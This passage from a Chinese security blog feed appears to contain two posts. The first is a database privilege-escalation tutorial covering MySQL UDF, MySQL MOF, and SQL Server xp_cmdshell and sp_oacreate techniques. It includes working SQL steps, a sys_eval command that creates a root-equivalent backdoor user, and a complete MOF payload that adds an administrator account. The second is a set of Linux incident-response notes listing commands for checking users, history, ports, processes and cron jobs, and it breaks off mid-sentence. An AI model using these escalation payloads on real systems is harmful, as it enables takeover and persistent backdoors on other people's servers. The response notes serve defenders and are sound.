title="查询软件版本"></a>查询软件版本</h4><p>为什么要查询版本呢？因为不同版本的动态链接文件导入的地方不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select version();<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648758.png" alt="img"></p><h4 id="查询系统位数"><a href="#查询系统位数" class="headerlink" title="查询系统位数"></a>查询系统位数</h4><p>为什么要查询系统位数呢？不同的系统和位数有不同的动态连接文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">show variables like &#x27;%compile%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648764.png" alt="img"></p><h4 id="查询读写权限"><a href="#查询读写权限" class="headerlink" title="查询读写权限"></a>查询读写权限</h4><p>为什么要查询读写权限呢？因为我们要将动态连接文件导入到相应的目录里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">show global variables like &#x27;secure%&#x27;;<br></code></pre></td></tr></table></figure><p>secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限，一般三种情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">show global variables like &#x27;secure%&#x27;;  查询<br>secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权<br>secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权<br></code></pre></td></tr></table></figure><p>如果想要更改就要改my.cnf文件中配置 secure_file_priv&#x3D;’’</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648780.png" alt="img"></p><h4 id="查看plugin目录位置"><a href="#查看plugin目录位置" class="headerlink" title="查看plugin目录位置"></a>查看plugin目录位置</h4><p>为什么要查询plugin？因为我们要将动态连接文件导入到此目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">show variables like &#x27;plugin%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648781.png" alt="img"></p><h4 id="生成动态连接文件"><a href="#生成动态连接文件" class="headerlink" title="生成动态连接文件"></a>生成动态连接文件</h4><p>不用我们生成了，在sqlmap中已经存在，或者msf中也存在，我们只需要用就行了，不需要在去写源代码。</p><p>存在位置为，其中分为windows 和linux 版本 分别有32位和64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">sqlmap/data/udf/mysql<br>metasploit-framework/data/exploits/mysql/<br></code></pre></td></tr></table></figure><h5 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h5><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648777.png" alt="img"></p><p>sqlmap中的是通过加密的，需要用解密脚本解密，解密脚本在 &#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><p><strong>用法如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python cloak.py -d -i lib_mysqludf_sys.so_(sqlmap中的加密动态连接文件)<br></code></pre></td></tr></table></figure><h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648059.png" alt="img"></p><h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><h4 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h4><p><strong>创建一张临时表用来存放DLL&#x2F;OS文件的16进制内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">CREATE TABLE temp_udf (udf blob);<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648069.png" alt="img"></p><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>其中<em>binaryCode</em>为已经转换好的十六进制内容,<strong>binaryCode前加0X</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">INSERT into temp_udf values (CONVERT($binaryCode,CHAR));<br></code></pre></td></tr></table></figure><p><strong>转化成16进制方法很多，我么借助mysql</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select hex(load_file(&#x27;C:/udf.dll&#x27;)) into dumpfile &#x27;c:/udf.txt&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648078.png" alt="img"></p><h4 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h4><p><strong>选择对应的地方进行导出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT udf FROM temp_udf INTO DUMPFILE &quot;导入到固定的目录下，之前查的地方，符号要加转义字符&quot;<br></code></pre></td></tr></table></figure><h4 id="创建函数-1"><a href="#创建函数-1" class="headerlink" title="创建函数"></a>创建函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">create function sys_eval returns string soname &#x27;udf.os&#x27;;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648090.png" alt="img"></p><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select sys_eval(&quot;whoami&quot;);<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648119.png" alt="img"></p><p><strong>创建后门</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select sys_eval(&quot;useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test&quot;);<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648145.png" alt="img"></p><h2 id="MySQL-MOF提权"><a href="#MySQL-MOF提权" class="headerlink" title="MySQL-MOF提权"></a>MySQL-MOF提权</h2><h3 id="MOF介绍"><a href="#MOF介绍" class="headerlink" title="MOF介绍"></a>MOF介绍</h3><p>mof是windows系统的一个“托管对象格式”文件（位置：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;），其作用是每隔五秒就会去监控进程创建和死亡，mof目录下有两个文件夹（good与bad）。windows server 2003及以下系统每5秒会执行一次mof目录下的文件，执行成功会移动到good文件夹，执行失败移动到bad文件夹。</p><h3 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h3><p>mof提权其实就是利用mysql 写入mof文件，通过mof文件中的vbs脚本以system权限执行系统命令</p><p>使用条件如下：</p><p>1、mysql是高权限运行</p><p>2、mysql需要具有导入导出功能</p><p>2、只能用于2003以下的系统（2003以上的系统不在使用该目录）</p><p>提权脚本如下：执行一段vbs语言，执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = &quot;Root\\Cimv2&quot;;<br>Name  = &quot;filtP2&quot;;<br>Query = &quot;Select * From __InstanceModificationEvent &quot;<br>&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;<br>&quot;And TargetInstance.Second = 5&quot;;<br>QueryLanguage = &quot;WQL&quot;;<br>&#125;;instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = &quot;consPCSV2&quot;;<br>ScriptingEngine = &quot;JScript&quot;;<br>ScriptText =<br>&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;;<br>&#125;;instance of __FilterToConsumerBinding<br>&#123;<br>Consumer   = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="MOF提权步骤"><a href="#MOF提权步骤" class="headerlink" title="MOF提权步骤"></a>MOF提权步骤</h3><p>和UDF提权一样，将文件转成二进制然后利用导出函数，导出到对应的目录，然后等待提权即可</p><p>1、创建一个表格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">CREATE TABLE temp_mof (mof blob);<br></code></pre></td></tr></table></figure><p>2、将二进制数据插入到表格中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">INSERT into temp_udf values (CONVERT($binaryCode,CHAR));<br></code></pre></td></tr></table></figure><p>如何将我们的文件导出成二进制问价呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select hex(load_file(&#x27;C:/mof.dll&#x27;)) into dumpfile &#x27;c:/mof.txt&#x27;<br></code></pre></td></tr></table></figure><p>3、导出到目标目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT udf FROM temp_udf INTO DUMPFILE &quot;c:/windows/system32/wbem/mof/wanli.mof&quot;<br></code></pre></td></tr></table></figure><p>4、等待片刻后提权成功</p><h2 id="SQL-Server-提权"><a href="#SQL-Server-提权" class="headerlink" title="SQL Server 提权"></a>SQL Server 提权</h2><h3 id="SQL-Server介绍"><a href="#SQL-Server介绍" class="headerlink" title="SQL Server介绍"></a>SQL Server介绍</h3><p>SQL Server 是Microsoft 公司推出的关系型数据库管理系统。具有使用方便可伸缩性好与相关软件集成程度高等优点，可跨越从运行Microsoft Windows 98 的膝上型电脑到运行Microsoft Windows 2012 的大型多处理器的服务器等多种平台使用。</p><h3 id="SQL-Server安装"><a href="#SQL-Server安装" class="headerlink" title="SQL Server安装"></a>SQL Server安装</h3><p>1、sqlserver需要 framework支持先安装这个</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648363.png" alt="img"><br>2、选择sqlserver的安装包进行安装</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648419.png" alt="img"><br>3、运行iso文件弹出安装界面，选择安装全新的sqlserver</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648401.png" alt="img">4、一直点击下一步进行安装，全部勾选选择安装</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648461.png" alt="img"><br>4、选择服务启动类型和账户名</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648451.png" alt="img"><br>5、添加sa账户的密码和执行管理员</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648508.png" alt="img"><br>6、一直点击下一步知道安装页面</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648724.png" alt="img"><br>7、安装完成后连接sqlserver服务端</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648793.png" alt="img"><br>8、完成后如下</p><p>SQL Server提权原理</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">1、任何版本的Sql Server都可以对xp_cmdshell 进行利用；<br>2 、SQL Server数据库没有被降权；<br>3、 sa用户或其他具有dba权限的账户。<br></code></pre></td></tr></table></figure><h3 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h3><p>xp_cmdshell可以执行系统命令，该组件默认是关闭的，因此需要把它打开。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</p><p>1、获取xp_cmdshell的状态如果为1就是有该组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648790.png" alt="img"><br>2、开启xp_cmdshell组件</p><p>开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;<br></code></pre></td></tr></table></figure><p>关闭：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648855.png" alt="img">3、执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">exec master..xp_cmdshell &#x27;ipconfig&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648883.png" alt="img"></p><h3 id="sp-oacreate-sp-oamethod（dba权限）"><a href="#sp-oacreate-sp-oamethod（dba权限）" class="headerlink" title="sp_oacreate+sp_oamethod（dba权限）"></a>sp_oacreate+sp_oamethod（dba权限）</h3><p>在xp_cmdshell被删除或不能利用是可以考虑利用sp_oacreate，利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql）。sp_oacreate 是一个存储过程，可以删除、复制、移动文件。还能配合 sp_oamethod 来写文件执行系统命令</p><p>1、判断sp_oacreate是否存在，返回1证明存在sp_oacreate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648005.png" alt="img"><br>2、开启相关的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;<br>exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648086.png" alt="img"><br>3、直接执行命令成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">declare @shell int,@exec int,@text int,@str varchar(8000)<br>exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output<br>exec sp_oamethod @shell,&#x27;exec&#x27;,@exec output,&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;<br>exec sp_oamethod @exec, &#x27;StdOut&#x27;, @text out<br>exec sp_oamethod @text, &#x27;readall&#x27;, @str out<br>select @str;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648130.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>应急响应笔记</title>
    <link href="/2025/01/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/01/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="LInux应急响应"><a href="#LInux应急响应" class="headerlink" title="LInux应急响应"></a><strong>LInux应急响应</strong></h1><h2 id="一-查看用户信息"><a href="#一-查看用户信息" class="headerlink" title="一.查看用户信息"></a><strong>一.查看用户信息</strong></h2><h3 id="1-查询可疑用户常用命令"><a href="#1-查询可疑用户常用命令" class="headerlink" title="1.查询可疑用户常用命令"></a><strong>1.查询可疑用户常用命令</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat /etc/passwd<br># 查看用户信息文件<br>cat /etc/shadow<br># 查看影子文件<br>awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd<br>cat /etc/passwd | grep x:0<br># 查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户<br>w                   查看目前登入系统的用户，以及他们正在执行的程序。<br>lastb               查看用户错误的登录信息<br>lastlog             查看所有用户最后的登录信息<br>last                查看用户最近登录信息<br>who                 查看当前用户登录系统信息<br>awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow<br>uptime               查看现在的时间、系统开机时长、目前多少用户登录。<br>stat /etc/passwd            查看密码文件上一次修改的时间，如果最近被修改过，那就可能存在问题<br>cat /etc/passwd | grep -v nologin             查看除了不可登录以外的用户都有哪些，有没有新增的<br>cat /etc/passwd | grep /bin/bash             查看能用bash shell登录的用户<br></code></pre></td></tr></table></figure><h3 id="2-删除用户"><a href="#2-删除用户" class="headerlink" title="2. 删除用户"></a>2. <strong>删除用户</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头userdel user       删除 user 用户<br>userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除<br></code></pre></td></tr></table></figure><h2 id="二-历史命令"><a href="#二-历史命令" class="headerlink" title="二.历史命令"></a><strong>二.历史命令</strong></h2><h3 id="1-查看历史命令"><a href="#1-查看历史命令" class="headerlink" title="1. 查看历史命令"></a>1. <strong>查看历史命令</strong></h3><h4 id="1-1root用户历史命令"><a href="#1-1root用户历史命令" class="headerlink" title="1.1root用户历史命令"></a><strong>1.1root用户历史命令</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">history<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646697.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat .bash_history &gt;&gt;history.txt  //保存历史命令至history.txt<br></code></pre></td></tr></table></figure><h4 id="1-2普通用户历史命令"><a href="#1-2普通用户历史命令" class="headerlink" title="1.2普通用户历史命令"></a><strong>1.2普通用户历史命令</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。<br>为历史的命令增加登录的 IP 地址、执行命令时间等信息：<br>1）保存1万条命令<br>sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile<br>2）在/etc/profile的文件尾部添加如下行数配置信息：<br>######jiagu history xianshi#########<br>USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`<br>if [ &quot;$USER_IP&quot; = &quot;&quot; ]<br>then<br>USER_IP=`hostname`<br>fi<br>export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;<br>shopt -s histappend<br>export PROMPT_COMMAND=&quot;history -a&quot;<br>######### jiagu history xianshi ##########<br>3）source /etc/profile 让配置生效<br>生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile<br></code></pre></td></tr></table></figure><h4 id="1-3-历史操作命令的清除：history-c"><a href="#1-3-历史操作命令的清除：history-c" class="headerlink" title="1.3 历史操作命令的清除：history -c"></a><strong>1.3 历史操作命令的清除：history -c</strong></h4><p>但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</p><h4 id="1-4入侵排查"><a href="#1-4入侵排查" class="headerlink" title="1.4入侵排查"></a><strong>1.4入侵排查</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">进入用户目录下，导出历史命令。<br>cat .bash_history &gt;&gt; history.txt<br></code></pre></td></tr></table></figure><h3 id="2-端口"><a href="#2-端口" class="headerlink" title="2. 端口"></a>2. <strong>端口</strong></h3><h4 id="2-1查看端口开放和链接情况"><a href="#2-1查看端口开放和链接情况" class="headerlink" title="2.1查看端口开放和链接情况"></a><strong>2.1查看端口开放和链接情况</strong></h4><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">netstat -pantu<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646702.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">netstat -antlp | more<br><br>查看下 pid 所对应的进程文件路径，<br>运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）<br></code></pre></td></tr></table></figure><h3 id="3-进程"><a href="#3-进程" class="headerlink" title="3. 进程"></a>3. <strong>进程</strong></h3><h4 id="3-1-查看进程"><a href="#3-1-查看进程" class="headerlink" title="3.1. 查看进程"></a>3.1. <strong>查看进程</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ps -aux<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061646709.png" alt="img"></p><ol><li>查看关联进程</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ps -aux | grep pid<br></code></pre></td></tr></table></figure><ol start="2"><li>查看cpu占用率前十的进程</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ps aux --sort=pcpu | head -10<br></code></pre></td></tr></table></figure><h3 id="4-自启动项"><a href="#4-自启动项" class="headerlink" title="4. 自启动项"></a>4. <strong>自启动项</strong></h3><h4 id="4-1-查看开机启动项"><a href="#4-1-查看开机启动项" class="headerlink" title="4.1. 查看开机启动项"></a>4.1. <strong>查看开机启动项</strong></h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th><strong>运行级别</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>0</td><td>关机</td></tr><tr><td>1</td><td>单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td>2</td><td>不完全的命令行模式，不含NFS服务</td></tr><tr><td>3</td><td>完全的命令行模式，就是标准字符界面</td></tr><tr><td>4</td><td>系统保留</td></tr><tr><td>5</td><td>图形模式</td></tr><tr><td>6</td><td>重启动</td></tr></tbody></table><p>查看运行级别命令 runlevel</p><p>系统默认允许级别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">vi  /etc/inittab<br>id=3：initdefault  #系统开机后直接进入哪个运行级别<br></code></pre></td></tr></table></figure><h4 id="4-2开机启动配置文件"><a href="#4-2开机启动配置文件" class="headerlink" title="4.2开机启动配置文件"></a><strong>4.2开机启动配置文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">/etc/rc.local<br>/etc/rc.d/rc[0~6].d<br></code></pre></td></tr></table></figure><p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 &#x2F;etc&#x2F;init.d 目录下，然后在 &#x2F;etc&#x2F;rc.d&#x2F;rc*.d 文件中建立软链接即可。</p><p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh<br></code></pre></td></tr></table></figure><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><h4 id="4-3入侵排查："><a href="#4-3入侵排查：" class="headerlink" title="4.3入侵排查："></a><strong>4.3入侵排查：</strong></h4><p>启动项文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">more /etc/rc.local<br>/etc/rc.d/rc[0~6].d<br>ls -l /etc/rc.d/rc3.d/<br></code></pre></td></tr></table></figure><h3 id="5-定时任务"><a href="#5-定时任务" class="headerlink" title="5. 定时任务"></a>5. <strong>定时任务</strong></h3><h4 id="5-1利用-crontab-创建计划任务"><a href="#5-1利用-crontab-创建计划任务" class="headerlink" title="5.1利用 crontab 创建计划任务"></a><strong>5.1利用 crontab 创建计划任务</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">crontab -l   列出某个用户cron服务的详细内容(查看定时任务)<br><br>crontab -u root -l     查看指定用户的定时任务<br><br>cat /etc/passwd |awk -F &quot;:&quot; &#x27;&#123;print $1&#125;&#x27; | xargs -i crontab -u &#123;&#125; -l     查看所有人的计划任务<br><br>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root<br><br>crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)<br><br>crontab -e   使用编辑器编辑当前的crontab文件 <br><br>如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件<br></code></pre></td></tr></table></figure><h4 id="5-2利用-anacron-命令实现异步定时任务调度"><a href="#5-2利用-anacron-命令实现异步定时任务调度" class="headerlink" title="5.2利用 anacron 命令实现异步定时任务调度"></a><strong>5.2利用 anacron 命令实现异步定时任务调度</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">每天运行 /home/backup.sh 脚本：<br>vi /etc/anacrontab <br>@daily    10    example.daily   /bin/bash /home/backup.sh<br>当机器在 backup.sh 